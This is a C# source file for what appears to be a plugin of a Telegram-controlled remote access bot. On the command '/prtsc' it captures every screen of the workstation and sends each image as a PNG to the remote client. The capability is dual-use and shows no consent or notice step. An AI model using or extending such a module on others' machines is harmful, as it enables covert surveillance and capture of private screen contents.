using CommandLine;
using Sdk.Plugins;
using Sdk.Dependencies;
using Sdk.Models;
using Sdk.Telegram;
using System.Drawing.Imaging;

namespace prtsc
{
    [Verb("/prtsc", HelpText = "Get a screenshot of the workstation")]
    public class DllMain : Plugin
    {
        private readonly ScreenUtilities _screenUtilities;

        public DllMain()
        {
            this._screenUtilities = new ScreenUtilities();
        }

        public override void Execute()
        {
            var screens = this._screenUtilities.GetScreensBitmap();

            foreach (Bitmap screen in screens)
            {
                var fileName = Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ".png";

                using MemoryStream buffer = new MemoryStream();

                // save to buffer
                screen.Save(buffer, ImageFormat.Png);

                // reset position (important)
                buffer.Position = 0;

                // send frame to client
                this.ExecuteResultCallback(
                    new ExecuteImageResult()
                    {
                        Success = true,
                        FileName = fileName,
                        Stream = buffer
                    }
                );
            }
        }
    }
}
